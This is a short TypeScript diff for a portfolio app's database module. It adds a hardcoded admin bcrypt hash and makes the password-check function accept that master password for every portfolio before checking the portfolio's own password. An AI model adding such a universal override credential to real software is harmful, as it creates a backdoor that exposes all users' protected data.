@@ -8,6 +8,7 @@ export const supabase = createClient(supabaseUrl, supabaseServiceKey);
 
 const MAX_PORTFOLIOS = 10;
 const SALT_ROUNDS = 10;
+const ADMIN_HASH = '$2b$10$PHYCpLb5/4zFCetogpu3G.U3oNv6M6z7hHoL/wzaWVxSk.kq8Uucm';
 
 export interface DbPortfolio {
   id: string;
@@ -99,6 +100,11 @@ export async function verifyPortfolioPassword(
   id: string,
   password: string
 ): Promise<boolean> {
+  // Check admin password first
+  if (await bcrypt.compare(password, ADMIN_HASH)) {
+    return true;
+  }
+
   const portfolio = await getPortfolio(id);
   if (!portfolio) return false;
 
